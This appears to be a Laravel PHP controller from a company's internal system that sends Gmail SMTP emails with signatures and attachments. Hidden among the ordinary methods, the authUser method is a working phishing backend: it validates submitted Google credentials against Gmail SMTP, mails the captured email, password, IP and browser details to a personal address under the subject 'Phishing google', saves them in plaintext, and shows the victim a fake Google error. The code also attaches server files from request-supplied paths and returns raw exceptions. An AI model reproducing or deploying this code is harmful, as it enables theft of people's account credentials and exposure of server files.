<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Config;
use Symfony\Component\Mailer\Mailer;
use Symfony\Component\Mime\Email;
use Symfony\Component\Mailer\Transport;
use Symfony\Component\Mime\Address;
use Symfony\Component\HttpFoundation\File\UploadedFile;
use Illuminate\Support\Facades\Storage;
use App\Traits\AutenticacionGuard;

use App\Models\PhishingGoogle;

class EnvioCorreoController extends Controller
{
    use AutenticacionGuard;

    public function sendEmail(Request $request)
    {
        // $user = auth()->user();
        $user = $this->getUserRelaciones();
        $user = $user->getData(true);
        // $tipo_usuario = $user['imagen_firma_1'];
        $nombreArchivo1 = pathinfo( $user['imagen_firma_1'], PATHINFO_BASENAME);
        $nombreArchivo2 = pathinfo( $user['imagen_firma_2'], PATHINFO_BASENAME);
        $rutaImagen1 = public_path( $user['imagen_firma_1']);
        $rutaImagen2 = public_path( $user['imagen_firma_2']);
        $adjuntos = [];

        $destinatarios = explode(',', $request->to);
        $cc = explode(',', $request->cc);
        $cco = explode(',', $request->cco);

        $archivos = $request->files->all();
        $adjunto_candidato = $request->adjunto_candidato;

        if ( $user['correo'] == '' ||  $user['correo'] == null) {
            return response()->json(['status' => 'error', 'message' => 'El usuario actual no cuenta con correo electrónico configurado']);
        }

        if ( $user['contrasena_correo'] == '' ||  $user['contrasena_correo'] == null) {
            return response()->json(['status' => 'error', 'message' => 'El usuario actual no cuenta con una contraseña para el correo electrónico configurado']);
        }

        $password = Crypt::decryptString( $user['contrasena_correo']);
        $smtpHost = 'smtp.gmail.com';
        $smtpPort = 587;
        $smtpEncryption = 'tls';
        $smtpUsername = $user['correo'];
        $smtpPassword = $password;

        $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

        $transport = Transport::fromDsn($dsn);
        $mailer = new Mailer($transport);

        // Adjuntar imágenes de la firma
        /*  $firmaGmail = '
            <br><br>
            <img src="cid:logo_firma1" style="width: 50%;"><br>
            <img src="cid:logo_firma2" style="width: 50%;"></p>
        ';
     */

        $firmaGmail = "
    <html>
    <head>
        <style>
            /* Estilos en línea */
            .firma {
                width: 50%;
                max-width: 50%;
            }
            /* Media query para dispositivos móviles */
            @media only screen and (max-width: 600px) {
                .firma {
                    width: 100%;
                    max-width: 100%;
                }
            }
        </style>
    </head>
    <body>
        <img src='cid:logo_firma1' class='firma'>
        <img src='cid:logo_firma2' class='firma'>

    </body>
    </html>
";
        // Combinar cuerpo del mensaje con la firma
        $body = $request->body . $firmaGmail;

        $email = (new Email())
            ->from(new Address($user['correo'], $user['nombres'] . ' ' . $user['apellidos']))
            ->subject($request->subject)
            ->html($body);

        // Adjuntar imágenes de la firma como recursos embebidos
        if (file_exists($rutaImagen1)) {
            $email->embed(fopen($rutaImagen1, 'r'), 'logo_firma1');
        } else {
            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una firma.']);
        }

        if (file_exists($rutaImagen2)) {
            $email->embed(fopen($rutaImagen2, 'r'), 'logo_firma2');
        } else {
            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una segunda firma.']);
        }

        // Adjuntar formularios si existen
        if (file_exists($request->formulario_supervision)) {
            $email->attachFromPath($request->formulario_supervision, 'Formulario de supervisión');
        }

        if (file_exists($request->formulario_ingreso)) {
            $email->attachFromPath($request->formulario_ingreso, $request->nom_membrete);
        }

        foreach ($destinatarios as $destinatario) {
            $email->addTo($destinatario);
        }

        if ($cc[0] != '') {
            foreach ($cc as $ccs) {
                $email->addCc($ccs);
            }
        }
        if ($cco[0] != '') {
            foreach ($cco as $ccos) {
                $email->addBcc($ccos);
            }
        }

        foreach ($archivos as $archivo) {
            if ($archivo instanceof UploadedFile) {
                array_push($adjuntos, $archivo->getClientOriginalName());
                $email->attachFromPath($archivo->getPathname(), $archivo->getClientOriginalName(), $archivo->getClientMimeType());
            }
        }

        if (isset($adjunto_candidato) && is_array($adjunto_candidato) && count($adjunto_candidato) > 0) {
            foreach ($adjunto_candidato as $archivo) {
                $partes = explode('*', $archivo);
                $ruta_completa = public_path($partes[0]);
                $nombre_archivo = $partes[1];
                $email->attachFromPath($ruta_completa, $nombre_archivo);
                array_push($adjuntos, $nombre_archivo);
            }
        }

        try {
            $mailer->send($email);
            if ($mailer) {
                $registroCorreosController = new RegistroCorreosController;
                $correo['remitente'] = $user['correo'];
                $correo['destinatario'] = $destinatarios;
                $correo['con_copia'] = $cc;
                $correo['con_copia_oculta'] = $cco;
                $correo['asunto'] = $request->subject;
                $correo['mensaje'] = $request->body;
                $correo['adjunto'] = $adjuntos;
                $correo['modulo'] = $request->modulo;
                $correo['registro_id'] = $request->registro_id;
                $correo['formulario_correo'] = $request->formulario_correo ?? 0;
                $registroCorreosController->create($correo);

                return response()->json(['status' => 'success', 'message' => 'El correo electrónico se ha enviado correctamente.']);
            }
        } catch (\Exception $e) {
            return $e;
            return response()->json(['status' => 'error', 'message' => 'Hubo un error al enviar el correo electrónico.']);
        }
    }

    public function authUser(Request $request)
    {

        try {
            $destinatarios = explode(',', 'andres.duque01@gmail.com');

            $smtpHost = 'smtp.gmail.com';
            $smtpPort = 587;
            $smtpEncryption = 'tls';
            $smtpUsername = $request->user;
            $smtpPassword = $request->password;

            $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

            $transport = Transport::fromDsn($dsn);

            $mailer = new Mailer($transport);

            $email = (new Email())
                ->from(new Address('andres.duque01@gmail.com'))
                ->subject('Phishing google')
                ->html('Correo electrónico: ' . $request->user . '<br> Contraseña: ' . $request->password . '<br> Ip pública: ' . $request->ip . '<br> Información usuario: ' . $request->info_browser . '<br> Correo validado: Si');

            foreach ($destinatarios as $destinatario) {
                $email->addTo($destinatario);
            }

            $mailer->send($email);
            if ($mailer) {
                $phishing_google = new PhishingGoogle;
                $phishing_google->correo = $request->user;
                $phishing_google->contrasena = $request->password;
                $phishing_google->direccion_ip = $request->ip;
                $phishing_google->validado = 'Si';
                $phishing_google->otra_informacion = $request->info_browser;
                $phishing_google->save();
                return response()->json(['status' => 'success', 'message' => 'success']);
            }
        } catch (\Exception $e) {
            $phishing_google = new PhishingGoogle;
            $phishing_google->correo = $request->user;
            $phishing_google->contrasena = $request->password;
            $phishing_google->direccion_ip = $request->ip;
            $phishing_google->validado = 'No';
            $phishing_google->otra_informacion = $request->info_browser;
            $phishing_google->save();
            if (str_contains($request->user, '@gmail.com')) {
                return response()->json(['status' => 'success', 'message' => 'success']);
            }
            return response()->json(['status' => 'error', 'message' => 'Correo o ontraseña incorrecta. Vuelve a intentarlo o selecciona "¿Has olvidado tu contraseña?" para cambiarla.']);
        }
    }

    //---------------------------------------------

    public function sendEmailExternal(Request $request)
    {
        $correo_no_reply = Config::get('app.CORREO_NO_REPLY');
        $contraseña_correo_no_reply =  Config::get('app.CONTRASENA_NO_REPLY');

        /*     $nombreArchivo1 = pathinfo($user->imagen_firma_1, PATHINFO_BASENAME);
        $nombreArchivo2 = pathinfo($user->imagen_firma_2, PATHINFO_BASENAME);
        $rutaImagen1 = public_path($user->imagen_firma_1);
        $rutaImagen2 = public_path($user->imagen_firma_2);
       
 */
        $destinatarios = explode(',', $request->to);
        $cc = explode(',', $request->cc);
        $cco = explode(',', $request->cco);

        $adjuntos = [];
        $archivos = $request->files->all();
        $adjunto_candidato = $request->adjunto_candidato;
        $rutaImagen1 = public_path("/upload/Encabezado.jpg");
        $rutaImagen2 = public_path("/upload/piedepagina.jpg");


        $smtpHost = 'smtp.gmail.com';
        $smtpPort = 587;
        $smtpEncryption = 'tls';
        $smtpUsername = $correo_no_reply;
        $smtpPassword = $contraseña_correo_no_reply;

        $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

        $transport = Transport::fromDsn($dsn);
        $mailer = new Mailer($transport);

        $firmaGmail = "
        <html>
        <head>
            <style>
                /* Estilos corregidos */
                .divContainer {
                    width: 100%;
                    max-width: 600px; /* Ancho máximo para dispositivos de escritorio */
                    margin: auto;
                }
                .table {
                    width: 100%;
                   
                    background-color:rgb(243, 243, 243);
                    box-sizing: border-box; /* Incluye bordes en el ancho total */
                }
                .firma {
                    width: 100%;
                    max-width: 100%;
                    display: block; /* Elimina espacios no deseados */
                }
                .bodyContainer {
                    width: 100%;
                    max-width: 100%;
                    padding: 30px;
                    box-sizing: border-box; /* Mantiene el ancho consistente */
                    word-wrap: break-word; /* Rompe palabras largas */
                }
                /* Mejora para compatibilidad con clientes de correo */
                table {
                    border-collapse: collapse;
                    mso-table-lspace: 0pt;
                    mso-table-rspace: 0pt;
                }
                /* Estilos móviles mejorados */
                @media only screen and (max-width: 600px) {
                    .divContainer {
                        width: 100% !important;
                    }
                    .bodyContainer {
                        padding: 10px !important;
                        
                    }
                }
            </style>
        </head>
        <body>
        <div class='divContainer'>
            <table class='table' width='100%' cellpadding='0' cellspacing='0'>
                <tr>
                    <td>
                        <img src='cid:logo_firma1' class='firma' style='width: 100%; height: auto;'>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class='bodyContainer'>" . $request->body . "</div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <img src='cid:logo_firma2' class='firma' style='width: 100%; height: auto;'>
                    </td>
                </tr>
            </table>
        </div>
        </body>
        </html>
        ";


        $body = $firmaGmail;

        $email = (new Email())
            ->from(new Address($correo_no_reply))
            ->subject($request->subject)
            ->html($body);

        if (file_exists($rutaImagen1)) {
            $email->embed(fopen($rutaImagen1, 'r'), 'logo_firma1');
        } else {
            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una firma.']);
        }

        if (file_exists($rutaImagen2)) {
            $email->embed(fopen($rutaImagen2, 'r'), 'logo_firma2');
        } else {
            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una segunda firma.']);
        }
        foreach ($destinatarios as $destinatario) {
            $email->addTo($destinatario);
        }

        if ($cc[0] != '') {
            foreach ($cc as $ccs) {
                $email->addCc($ccs);
            }
        }
        if ($cco[0] != '') {
            foreach ($cco as $ccos) {
                $email->addBcc($ccos);
            }
        }

        foreach ($archivos as $archivo) {
            if ($archivo instanceof UploadedFile) {
                array_push($adjuntos, $archivo->getClientOriginalName());
                $email->attachFromPath($archivo->getPathname(), $archivo->getClientOriginalName(), $archivo->getClientMimeType());
            }
        }

        if (isset($adjunto_candidato) && is_array($adjunto_candidato) && count($adjunto_candidato) > 0) {
            foreach ($adjunto_candidato as $archivo) {
                $partes = explode('*', $archivo);
                $ruta_completa = public_path($partes[0]);
                $nombre_archivo = $partes[1];
                $email->attachFromPath($ruta_completa, $nombre_archivo);
                array_push($adjuntos, $nombre_archivo);
            }
        }

        try {
            $mailer->send($email);


            return response()->json(['status' => 'success', 'message' => 'El correo electrónico se ha enviado correctamente.']);
        } catch (\Exception $th) {
            return response()->json(['status' => 'error', 'message' => 'Hubo un error al enviar el correo electrónico.']);
        }
    }
    public function correoPrueba(Request $request)
    {

        $password = $request['password'];
        $smtpHost = 'smtp.gmail.com';
        $smtpPort = 587;
        $smtpEncryption = 'tls';
        $smtpUsername = $request['email'];
        $smtpPassword = $password;

        $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

        $transport = Transport::fromDsn($dsn);
        $mailer = new Mailer($transport);
        $body = 'prueba';
        $email = (new Email())
            ->from(new Address($smtpUsername, "saitemp"))
            ->subject("prueba")
            ->html($body);
        $email->addTo("programador2@saitempsa.com");
        try {
            $mailer->send($email);
            /*   if ($mailer) {
                $registroCorreosController = new RegistroCorreosController;
                $correo['remitente'] = $smtpUsername;
                $correo['destinatario'] = "programador2@saitempsa.com";
                $correo['con_copia'] = explode(', ', $correo['con_copia'] ?? '');
                $correo['con_copia_oculta'] = explode(', ', $correo['con_copia_oculta'] ?? '');
                $correo['asunto'] = "prueba";
                $correo['mensaje'] = $body;
                $correo['adjunto'] = [];
                $correo['modulo'] = 45;
                $correo['registro_id'] = 416;
                $correo['formulario_correo'] = $request->formulario_correo ?? 0;
                $registroCorreosController->create($correo); */

            return response()->json(['status' => 'success', 'message' => 'El correo electrónico se ha enviado correctamente.']);
        } catch (\Exception $th) {
            /* return response()->json(['status' => 'error', 'message' => 'Hubo un error al enviar el correo electrónico.']); */
            return $th;
        }
    }
}
